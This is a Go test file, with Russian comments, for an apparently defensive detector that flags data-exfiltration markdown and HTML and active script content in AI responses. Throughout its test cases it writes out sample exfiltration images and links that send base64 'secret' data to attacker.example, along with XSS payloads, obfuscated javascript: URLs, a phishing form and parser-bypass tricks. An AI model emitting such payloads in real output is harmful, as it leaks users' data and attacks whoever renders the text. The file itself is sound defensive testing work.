package exfil

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/azuresong-afk/ai_railway/internal/detect"
	"github.com/azuresong-afk/ai_railway/internal/detect/corpus"
)

// Домены в тестах — зарезервированные (RFC 2606): example.com, *.example,
// *.test. Данные в ссылках — синтетические.

func findWith(t testing.TB, d Detector, text string) []detect.Finding {
	t.Helper()
	fs, err := d.Detect(context.Background(), detect.Text{Text: text, Direction: detect.Output, Source: detect.SourceOutput})
	if err != nil {
		t.Fatal(err)
	}
	for i, f := range fs {
		if err := detect.ValidateFinding(f, d, text); err != nil {
			t.Fatalf("%q: %v", text, err)
		}
		if i > 0 && f.Start < fs[i-1].End {
			t.Fatalf("%q: находки пересекаются: %+v", text, fs)
		}
	}
	return fs
}

func find(t testing.TB, text string) []detect.Finding { t.Helper(); return findWith(t, New(), text) }

func above(fs []detect.Finding) []detect.Finding {
	var out []detect.Finding
	for _, f := range fs {
		if f.Score >= 0.5 {
			out = append(out, f)
		}
	}
	return out
}

type want struct{ text, cat, rule, span string }

func check(t *testing.T, d Detector, cases []want) {
	t.Helper()
	for _, c := range cases {
		fs := above(findWith(t, d, c.text))
		if len(fs) != 1 || fs[0].Category != c.cat || fs[0].Rule != c.rule || c.text[fs[0].Start:fs[0].End] != c.span {
			t.Errorf("%q: %+v, ожидалось %s/%s на %q", c.text, fs, c.cat, c.rule, c.span)
			continue
		}
		wantThreat := "DM-11"
		if c.cat == CatActive {
			wantThreat = "DM-12"
		}
		if fs[0].Threat != wantThreat {
			t.Errorf("%q: строка матрицы %s", c.text, fs[0].Threat)
		}
	}
}

// TestDM11_Exfiltration: изображения и ссылки с данными, data:-URI, домены
// вне allowlist (DM-11). Позиции — конструкция целиком.
func TestDM11_Exfiltration(t *testing.T) {
	img := "![](https://attacker.example/p.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM)"
	check(t, New(), []want{
		{"Готово. " + img + " Спасибо.", CatImage, "image_data", img},
		{"![логотип](https://attacker.example/logo.png)", CatImage, "image_domain", "![логотип](https://attacker.example/logo.png)"},
		{"![x](<https://attacker.example/a b.png> \"t\")", CatImage, "image_domain", "![x](<https://attacker.example/a b.png> \"t\")"},
		{"![](https://attacker.example/q?text=Иван%20Петров%20паспорт)", CatImage, "image_data", "![](https://attacker.example/q?text=Иван%20Петров%20паспорт)"},
		{"![](https://c2VjcmV0LWRhdGEtMTIzNDU2.attacker.example/x.gif)", CatImage, "image_data", "![](https://c2VjcmV0LWRhdGEtMTIzNDU2.attacker.example/x.gif)"},
		{"![](//attacker.example/p.png)", CatImage, "image_domain", "![](//attacker.example/p.png)"},
		{"![](https:attacker.example/p.png)", CatImage, "image_domain", "![](https:attacker.example/p.png)"},
		{"![](HTTPS://Attacker.Example/p.png)", CatImage, "image_domain", "![](HTTPS://Attacker.Example/p.png)"},
		{"![a][r]\n\n[r]: https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu", CatImage, "image_data", "[r]: https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu"},
		{"![r]\n\n[R]: https://attacker.example/p.png", CatImage, "image_domain", "[R]: https://attacker.example/p.png"},
		{`<img src="https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu">`, CatImage, "image_data", `<img src="https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu">`},
		{`<IMG SRC=https://attacker.example/p.png>`, CatImage, "image_domain", `<IMG SRC=https://attacker.example/p.png>`},
		{`<img srcset="/ok.png 1x, https://attacker.example/p.png 2x">`, CatImage, "image_domain", `<img srcset="/ok.png 1x, https://attacker.example/p.png 2x">`},
		{`<div style="background:url('https://attacker.example/p.png')">`, CatImage, "image_domain", `<div style="background:url('https://attacker.example/p.png')">`},
		{`<svg><image href="https://attacker.example/p.png"/></svg>`, CatImage, "image_domain", `<image href="https://attacker.example/p.png"/>`},
		{"body { background: url(https://attacker.example/p.png) }", CatImage, "image_domain", "url(https://attacker.example/p.png)"},
		{"[Подробнее](https://attacker.example/r?session=eyJ1c2VyIjoiaXZhbm92IiwidG9rZW4iOiJhYmMxMjMifQ)", CatLink, "link_data", "[Подробнее](https://attacker.example/r?session=eyJ1c2VyIjoiaXZhbm92IiwidG9rZW4iOiJhYmMxMjMifQ)"},
		{"[тык](https://user:Qr3xZ9@attacker.example/)", CatLink, "link_data", "[тык](https://user:Qr3xZ9@attacker.example/)"},
		{"[тык](https://docs.example.com@attacker.example/)", CatLink, "link_data", "[тык](https://docs.example.com@attacker.example/)"},
		{"Ссылка: https://attacker.example/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O.", CatLink, "link_data", "https://attacker.example/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O"},
		{"<https://attacker.example/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O>", CatLink, "link_data", "<https://attacker.example/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O>"},
		{`{"url":"https:\/\/attacker.example\/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O","x":1}`, CatLink, "link_data", `https:\/\/attacker.example\/c?d=SW1wb3J0YW50OiBjbGllbnQgSU5O`},
		{"www.attacker.example/c/SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4", CatLink, "link_data", "www.attacker.example/c/SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4"},
		{"[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)", CatDataURI, "data_uri_active", "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"},
		{"![a](data:image/png;base64,iVBORw0KGgo=)", CatDataURI, "data_uri", "![a](data:image/png;base64,iVBORw0KGgo=)"},
		{`<a href="data:image/svg+xml,<svg onload=alert(1)>">x</a>`, CatDataURI, "data_uri_active", `<a href="data:image/svg+xml,<svg onload=alert(1)>">`},
		// Значок-изображение внутри ссылки: ссылка без данных — находка только
		// на изображении; ссылка с данными — одна находка на всю конструкцию
		// с наибольшей оценкой.
		{"[![b](https://attacker.example/b.png?d=c2VjcmV0X3Rva2Vu)](https://docs.example.com/)", CatImage, "image_data", "![b](https://attacker.example/b.png?d=c2VjcmV0X3Rva2Vu)"},
		{"[![b](https://attacker.example/b.png)](https://attacker.example/r?s=eyJ1c2VyIjoiaXZhbm92IiwiaWQiOjF9)", CatLink, "link_data", "[![b](https://attacker.example/b.png)](https://attacker.example/r?s=eyJ1c2VyIjoiaXZhbm92IiwiaWQiOjF9)"},
	})
	// Длинный текст в параметре: позиции — вся ссылка.
	text := "[x](https://attacker.example/?q=" + strings.Repeat("слово+", 20) + ")"
	if fs := above(find(t, text)); len(fs) != 1 || fs[0].Start != 0 || fs[0].End != len(text) {
		t.Errorf("длинный текст: %+v", fs)
	}
}

// TestDM12_ActiveContent: HTML и JavaScript в ответе (DM-12).
func TestDM12_ActiveContent(t *testing.T) {
	check(t, New(), []want{
		{"Ответ <script>fetch('/x')</script>", CatActive, "html_script", "<script>"},
		{"<ScRiPt src=x>", CatActive, "html_script", "<ScRiPt src=x>"},
		{`<img src=x onerror="alert(1)">`, CatActive, "html_handler", `<img src=x onerror="alert(1)">`},
		{`<svg/onload=alert(1)>`, CatActive, "html_handler", `<svg/onload=alert(1)>`},
		{`<details open ontoggle=alert(1)>`, CatActive, "html_handler", `<details open ontoggle=alert(1)>`},
		{`<iframe src="https://docs.example.com/">`, CatActive, "html_embed", `<iframe src="https://docs.example.com/">`},
		{`<form action="https://attacker.example/login"><input name=p></form>`, CatActive, "html_embed", `<form action="https://attacker.example/login">`},
		{`<meta http-equiv="refresh" content="0;url=https://attacker.example/">`, CatActive, "html_embed", `<meta http-equiv="refresh" content="0;url=https://attacker.example/">`},
		{`<object data="x.swf"></object>`, CatActive, "html_embed", `<object data="x.swf">`},
		{"<style>body{display:none}</style>", CatActive, "html_style", "<style>"},
		{"[нажми](javascript:alert(1))", CatActive, "js_url", "[нажми](javascript:alert(1))"},
		{"[нажми](JaVaScRiPt:alert(1))", CatActive, "js_url", "[нажми](JaVaScRiPt:alert(1))"},
		{"[нажми](&#106;avascript:alert(1))", CatActive, "js_url", "[нажми](&#106;avascript:alert(1))"},
		{"[нажми](javascript&colon;alert(1))", CatActive, "js_url", "[нажми](javascript&colon;alert(1))"},
		{`<a href="jav&#x09;ascript:alert(1)">x</a>`, CatActive, "js_url", `<a href="jav&#x09;ascript:alert(1)">`},
		{"<a href=\" \tjava\nscript:alert(1)\">x</a>", CatActive, "js_url", "<a href=\" \tjava\nscript:alert(1)\">"},
		{"<a href='vbscript:msgbox(1)'>x</a>", CatActive, "js_url", "<a href='vbscript:msgbox(1)'>"},
		{"<javascript:alert(1)>", CatActive, "js_url", "<javascript:alert(1)>"},
	})
}

// Allowlist: изображения и ссылки на разрешённые домены не считаются; при
// заданном allowlist ссылки на другие домены — находка.
func TestDM11_Allowlist(t *testing.T) {
	d, err := NewWithConfig(Config{AllowDomains: []string{"docs.example.com", "*.cdn.example", "BANK.TEST"}})
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{
		"![](https://docs.example.com/a.png?d=c2VjcmV0X3Rva2Vu)",
		"![](https://img.cdn.example/a.png)",
		"![](https://a.b.cdn.example/a.png)",
		"[кабинет](https://bank.test/login)",
		"![](https://BANK.test./a.png)",
		`![](https://attacker.example\@docs.example.com/a.png)`, // markdown снимает «\»: хост — docs.example.com
		"![](/static/logo.png)",
		"[раздел](#faq)",
	} {
		if fs := above(findWith(t, d, text)); len(fs) > 0 {
			t.Errorf("%q: %+v", text, fs)
		}
	}
	check(t, d, []want{
		{"[сайт](https://other.example/)", CatLink, "link_domain", "[сайт](https://other.example/)"},
		{"![](https://cdn.example/a.png)", CatImage, "image_domain", "![](https://cdn.example/a.png)"}, // *.cdn.example — только поддомены
		{"![](https://docs.example.com.attacker.example/a.png)", CatImage, "image_domain", "![](https://docs.example.com.attacker.example/a.png)"},
		{"![](https://docs.example.com%2eattacker.example/a.png)", CatImage, "image_domain", "![](https://docs.example.com%2eattacker.example/a.png)"},
		{"![](https://evildocs.example.com/a.png)", CatImage, "image_domain", "![](https://evildocs.example.com/a.png)"},
		{"![](https://docs.example.com:443@attacker.example/a.png)", CatImage, "image_data", "![](https://docs.example.com:443@attacker.example/a.png)"},
		{"[сайт](https://docs.еxample.com/)", CatLink, "link_domain", "[сайт](https://docs.еxample.com/)"}, // кириллическая «е»
	})
	// Без allowlist ссылки без данных не считаются.
	if fs := above(find(t, "[сайт](https://other.example/)")); len(fs) > 0 {
		t.Errorf("ссылка без данных без allowlist: %+v", fs)
	}
}

// TestDM11_ParserBypasses: обходы разбора — вложенная разметка в адресах,
// атрибутах и url(), экранирование markdown, откат к сокращённой сноске,
// встроенный код, исчерпание бюджета разбора.
func TestDM11_ParserBypasses(t *testing.T) {
	img := "![x](https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu)"
	for _, text := range []string{
		strings.Repeat("<a/b=", 60) + strings.Repeat("x", 5000) + " " + img,
		"см. url(x " + img,
		`<a title="` + img + `">`,
		"https://ok.example/" + img,
		"`a\\` " + img + " `b`",
		"# `a\n" + img + "\n# `b`",
		"- `a\n- " + img + "\n- `b`",
		"> `a\n> " + img + "\n> `b`",
	} {
		if fs := above(find(t, text)); len(fs) == 0 || fs[len(fs)-1].Score < 0.7 {
			t.Errorf("%q: %+v", text, fs)
		}
	}
	d, err := NewWithConfig(Config{AllowDomains: []string{"allowed.example"}})
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{
		`![x](https://allowed.example\@attacker.example/p.png)`,
		"![ref](no no no)\n\n[ref]: https://attacker.example/p.png",
		"![ref][missing\n\n[ref]: https://attacker.example/p.png",
	} {
		if fs := above(findWith(t, d, text)); len(fs) != 1 || fs[0].Category != CatImage {
			t.Errorf("%q: %+v", text, fs)
		}
	}
	check(t, New(), []want{
		{"https://attacker.example/?d='c2VjcmV0X3Rva2VuX2Zvcl9leGZpbA", CatLink, "link_data", "https://attacker.example/?d='c2VjcmV0X3Rva2VuX2Zvcl9leGZpbA"},
		{`{"url":"https:\u002f\u002fattacker.example\u002fc?d=SW1wb3J0YW50OiBjbGllbnQgSU5O"}`, CatLink, "link_data", `https:\u002f\u002fattacker.example\u002fc?d=SW1wb3J0YW50OiBjbGllbnQgSU5O`},
	})
	// Исчерпание бюджета разбора — находка до конца текста, а не молчание.
	text := strings.Repeat("[x]("+strings.Repeat("a", 2000), 2000)
	if fs := above(find(t, text)); len(fs) == 0 || fs[len(fs)-1].Rule != "parse_limit" {
		t.Errorf("бюджет: %+v", fs)
	}
}

func TestConfig(t *testing.T) {
	for _, bad := range [][]string{
		{"https://example.com"}, {"example.com/path"}, {"example.com:443"}, {"localhost"}, {""},
		{"*.com."}, {"-a.example"}, {"пример.рф"}, {"*example.com"}, {"a..example"},
		{strings.Repeat("a", 64) + ".example"},
	} {
		if _, err := NewWithConfig(Config{AllowDomains: bad}); err == nil {
			t.Errorf("%q принят", bad)
		}
	}
	if _, err := NewWithConfig(Config{AllowDomains: make([]string, MaxAllowDomains+1)}); err == nil {
		t.Error("превышение числа доменов принято")
	}
	if _, err := NewWithConfig(Config{AllowDomains: []string{"xn--e1afmkfd.xn--p1ai", "*.example.com"}}); err != nil {
		t.Error(err)
	}
}

// Обычные ответы со ссылками, кодом и разметкой не считаются (ложные
// срабатывания дороже, ТЗ 1.6).
func TestNoFalsePositives(t *testing.T) {
	for _, text := range []string{
		"Документация: https://docs.example.com/guide/install-python-on-windows и [FAQ](https://example.com/faq#section-2).",
		"Коммит https://git.example.com/org/repo/commit/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b, задача https://tracker.example/browse/PROJ-1234.",
		"Поиск: https://search.example/search?q=как+приготовить+борщ&hl=ru",
		"[Статья](https://example.com/blog/2024/10/19/python-3-12-release-notes-and-changes)",
		"Видео https://video.example/watch?v=dQw4w9WgXcQ&t=42s",
		"Документ https://docs.example.com/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit",
		"Используйте <b>жирный</b>, <i>курсив</i>, <br> и <table><tr><td>ячейки</td></tr></table>.",
		"<details><summary>Ответ</summary>Текст</details>",
		"Сравнение: 3 < 5 и 7 > 2, a<b>c, x <- y, <-- стрелка",
		"```html\n<script>alert(1)</script>\n<img src=\"https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu\">\n```",
		"~~~\n![](https://attacker.example/p.png)\n~~~",
		"Пример: `<img src=x onerror=alert(1)>` и ``![](https://attacker.example/p.png)``.",
		"  ```js\n  document.write('<iframe src=x>')\n  ```",
		"![схема](/static/diagram.png) и ![](./img/a.png)",
		"[ссылка на раздел](#install) и [почта](mailto:support@example.com)",
		"Файл C:\\Users\\Иван\\data.txt и путь /usr/local/bin",
		"Цитата из [1] и [2]: см. работу [Иванов, 2020].",
		"Массив arr[i](x) и вызов f[0](y)",
		"url(path) — функция; CSS: background: url(/img/bg.png)",
		"E-mail: ivanov@example.com, www-data — пользователь, wwwroot.",
		"Шаблон <имя> и <ФИО> заполните сами",
		"<!-- комментарий --> <!DOCTYPE html>",
		"http://localhost:8080/health и https://10.0.0.1/ — ссылки без данных",
		"",
	} {
		if fs := above(find(t, text)); len(fs) > 0 {
			t.Errorf("%q: ложное срабатывание %+v", text, fs)
		}
	}
	// Внутри кода находка остаётся, но ниже порога.
	fs := find(t, "```\n<script>x</script>\n```")
	if len(fs) != 1 || fs[0].Score != scoreInCode {
		t.Errorf("код: %+v", fs)
	}
}

func TestCodeSpans(t *testing.T) {
	for _, c := range []struct {
		text string
		want []string
	}{
		{"a `b` c", []string{"`b`"}},
		{"a ``b ` c`` d `e", []string{"``b ` c``"}},
		{"a \\`b` c", nil},
		{"`a\n\nb`", nil},
		{"```\nx\n```\ny `z`", []string{"```\nx\n```", "`z`"}},
		{"````\n```\nx\n````", []string{"````\n```\nx\n````"}},
		{"~~~\nx", []string{"~~~\nx"}},
		{"```a`b\nx", nil},
		{"    ```\nx\n```", []string{"```"}}, // код с отступом, затем незакрытая ограда
	} {
		spans, err := codeSpans(context.Background(), c.text)
		if err != nil {
			t.Fatal(err)
		}
		var got []string
		for _, s := range spans {
			got = append(got, c.text[s[0]:s[1]])
		}
		if strings.Join(got, "|") != strings.Join(c.want, "|") {
			t.Errorf("%q: %q, ожидалось %q", c.text, got, c.want)
		}
	}
}

func TestParseURL(t *testing.T) {
	for _, c := range []struct {
		raw, scheme, host string
		external, user    bool
	}{
		{"https://Example.COM./a?b#c", "https", "example.com", true, false},
		{"//example.com/x", "", "example.com", true, false},
		{`\\example.com\x`, "", "example.com", true, false},
		{"https:example.com", "https", "example.com", true, false},
		{`https:\/\/example.com\/x`, "https", "example.com", true, false},
		{"https://u:p@example.com:8443/", "https", "example.com", true, true},
		{"https://a@b@example.com/", "https", "example.com", true, true},
		{"https://[::1]:80/", "https", "[::1]", true, false},
		{"https://ex%61mple.com/", "https", "example.com", true, false},
		{"/relative/path", "", "", false, false},
		{"page.html?x=1", "", "", false, false},
		{"mailto:a@example.com", "mailto", "", false, false},
		{"javascript:alert(1)", "javascript", "", false, false},
		{"1http://x", "", "", false, false},
		{"", "", "", false, false},
	} {
		u := parseURL(c.raw)
		if u.scheme != c.scheme || u.host != c.host || u.external != c.external || u.userinfo != c.user {
			t.Errorf("%q: %+v", c.raw, u)
		}
	}
	if u := parseURL("https://e.example/p/q?a=1&b=2#frag"); u.path != "/p/q" || u.query != "a=1&b=2" {
		t.Errorf("путь и запрос: %+v", u)
	}
	for in, want := range map[string]string{
		"&#106;avascript:": "javascript:", "&#x6A;&#X61;": "ja", "a&colon;b": "a:b", "&amp;&unknown;": "&&unknown;",
		"&#0;": "\uFFFD", "&#xD800;": "\uFFFD", "&#": "&#", "&#x;": "&#x;", "&#0000000106;": "j",
	} {
		if got := decodeEntities(in); got != want {
			t.Errorf("decodeEntities(%q) = %q, ожидалось %q", in, got, want)
		}
	}
}

// Корпус проходит без сбоев, ложных срабатываний и пропусков (точность и
// полнота 1,000 в docs/detectors.md).
func TestCorpus(t *testing.T) {
	ss, err := corpus.Load("../../../testdata/corpus/output.exfil")
	if err != nil {
		t.Fatal(err)
	}
	rep, err := corpus.Evaluate(context.Background(), New(), ss, time.Second)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("примеров %d, точность %.3f, полнота %.3f", rep.Samples, rep.Total.Precision(), rep.Total.Recall())
	if len(rep.Errors) > 0 || len(rep.FalsePos) > 0 || len(rep.Missed) > 0 {
		t.Fatalf("сбои %v, ложные срабатывания %v, пропуски %v", rep.Errors, rep.FalsePos, rep.Missed)
	}
}

func TestContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := New().Detect(ctx, detect.Text{Text: strings.Repeat("[a](b) ", 1<<17), Direction: detect.Output}); err == nil {
		t.Fatal("отменённый контекст не учтён")
	}
}

// Детектор соблюдает срок и на больших текстах.
func TestDeadline(t *testing.T) {
	text := strings.Repeat("![a](https://x.example/?d=1) <img src=x> `c` ", 32<<20/45) // ~32 МиБ — предел тела ответа
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Millisecond)
	defer cancel()
	start := time.Now()
	_, err := New().Detect(ctx, detect.Text{Text: text, Direction: detect.Output})
	if !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("ошибка %v", err)
	}
	el := time.Since(start)
	t.Logf("остановился через %v", el)
	if el > time.Second {
		t.Fatalf("остановился через %v", el)
	}
}

// Время линейно на конструкциях, которые не удаётся разобрать до конца:
// незакрытые теги, адреса, кавычки, обратные кавычки.
func TestLinearWorstCases(t *testing.T) {
	for name, text := range map[string]string{
		"теги":       strings.Repeat(`<a x="`, 1<<20/6),
		"атрибуты":   "<a " + strings.Repeat("b ", 1<<19),
		"адреса":     strings.Repeat("](", 1<<19),
		"адреса2":    strings.Repeat("](a", 1<<20/3),
		"заголовки":  strings.Repeat(`](a "`, 1<<20/5),
		"автоссылки": strings.Repeat("<ab:", 1<<18),
		"угловые":    strings.Repeat("](<", 1<<20/3),
		"кавычки":    strings.Repeat("`` ` ", 1<<20/5),
		"скобки":     strings.Repeat("![", 1<<19) + strings.Repeat("]", 1<<19),
		"url":        strings.Repeat("url(", 1<<18),
		"схемы":      strings.Repeat("http://", 1<<20/7),
	} {
		start := time.Now()
		if _, err := New().Detect(context.Background(), detect.Text{Text: text, Direction: detect.Output}); err != nil {
			t.Fatal(err)
		}
		el := time.Since(start)
		t.Logf("%s: %v", name, el)
		if el > 2*time.Second {
			t.Errorf("%s: %v на 1 МБ", name, el)
		}
	}
}

// Цели фаззинга (ТЗ, 5.2, 8.5): детектор без паники, находки проходят
// проверку реестра и не пересекаются; разбор ссылки не паникует, хост в
// нижнем регистре, внешняя ссылка — только с хостом или схемой http(s).
func FuzzDetect(f *testing.F) {
	f.Add("![](https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu) <img src=x onerror=1>")
	f.Add("[a][r]\n[r]: <https://x.example/\u00a0>\n```\n`x`\n```")
	f.Add(`<a href="&#106;avascript:x">` + "url('//x') www.x.example/a\\/b")
	f.Add("[![b](//x.example/b.png)](https://y.example/) ](<a> \"t\")")
	allow, err := NewWithConfig(Config{AllowDomains: []string{"x.example", "*.y.example"}})
	if err != nil {
		f.Fatal(err)
	}
	f.Fuzz(func(t *testing.T, text string) {
		findWith(t, New(), text)
		findWith(t, allow, text)
	})
}

func FuzzParseURL(f *testing.F) {
	f.Add("https://u:p@Ex%61mple.com.:8080/a/b?c=d&e#f")
	f.Add(`\\x\y`)
	f.Add("https:[::1")
	f.Add("data:text/html,<x>")
	f.Fuzz(func(t *testing.T, raw string) {
		clean, _ := cleanURL(raw, fromHTML)
		u := parseURL(clean)
		if u.host != strings.ToLower(u.host) {
			t.Fatalf("хост не в нижнем регистре: %q", u.host)
		}
		if u.host != "" && !u.external {
			t.Fatalf("хост без признака внешней ссылки: %+v", u)
		}
		if u.external && u.scheme != "" && u.scheme != "http" && u.scheme != "https" && u.scheme != "ftp" && u.scheme != "ws" && u.scheme != "wss" {
			t.Fatalf("внешняя ссылка со схемой %q", u.scheme)
		}
		hasData(u, true)
		hasData(u, false)
	})
}

// Ответ 8 КБ: текст со ссылками, кодом и одним изображением с данными.
func BenchmarkDetect8KB(b *testing.B) {
	var sb strings.Builder
	for sb.Len() < 8<<10 {
		sb.WriteString("Ответ клиенту про тарифы, см. [документацию](https://docs.example.com/tariffs) и `код`. ")
		sb.WriteString("Ссылка https://example.com/a?b=1, <b>важно</b>. ")
	}
	sb.WriteString("![](https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu)")
	text := detect.Text{Text: sb.String(), Direction: detect.Output}
	d := New()
	b.SetBytes(int64(len(text.Text)))
	for b.Loop() {
		if _, err := d.Detect(context.Background(), text); err != nil {
			b.Fatal(err)
		}
	}
}

// Худший случай: 1 МБ изображений, тегов, ссылок и встроенного кода.
func BenchmarkDetectWorst(b *testing.B) {
	text := detect.Text{Text: strings.Repeat("![a](https://x.example/?d=1) <img src=x> `c` www.x.example ", 1<<20/60), Direction: detect.Output}
	d := New()
	b.SetBytes(int64(len(text.Text)))
	for b.Loop() {
		if _, err := d.Detect(context.Background(), text); err != nil {
			b.Fatal(err)
		}
	}
}
